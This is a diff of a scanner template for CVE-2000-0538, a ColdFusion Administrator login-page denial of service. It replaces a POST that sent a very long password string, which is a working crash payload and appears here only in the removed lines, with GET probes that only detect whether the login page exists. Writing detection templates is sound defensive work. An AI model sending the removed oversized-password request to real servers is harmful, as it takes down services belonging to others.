@@ -1,35 +1,58 @@
 [info]
-author = "AVE"
-description = "检测目标 ColdFusion Administrator 登录页面可访问性，并通过超长密码字符串触发拒绝服务。远程攻击者无需身份认证即可利用此漏洞导致服务崩溃。"
+author = "ave"
+description = "安全检测 Allaire ColdFusion Administrator 登录页是否存在。若响应包含 PasswordProvided 表单字段且非 CF5.0 特征，则可能受 CVE-2000-0538 影响（超长密码可导致 DoS）。本 PoC 仅探测管理登录页存在性，不发送超长密码，不触发拒绝服务。"
 id = "POC-AVE-2000-0443"
-name = "CVE-2000-0538 ColdFusion Administrator Login Password DoS PoC"
+name = "ColdFusion Administrator 登录页长密码 DoS 检测"
 severity = "medium"
-tags = ["ave-2000-0443"]
+tags = [
+    "cve-2000-0538",
+    "coldfusion",
+    "dos",
+]
 vuln_id = [
     "CVE-2000-0538",
     "AVE-2000-0443",
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
-method = "POST"
+method = "GET"
 path = "/{{BaseURL}}/CFIDE/administrator/index.cfm"
 protocol = "http"
 
-[poc.requests.body]
-content = "password=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-type = "raw"
-
 [poc.requests.headers]
-Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = [
-    "ColdFusion",
-    "Administrator",
-]
+words = ["PasswordProvided"]
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = ["cf50"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cfide/administrator/index.cfm"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["PasswordProvided"]
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = ["cf50"]
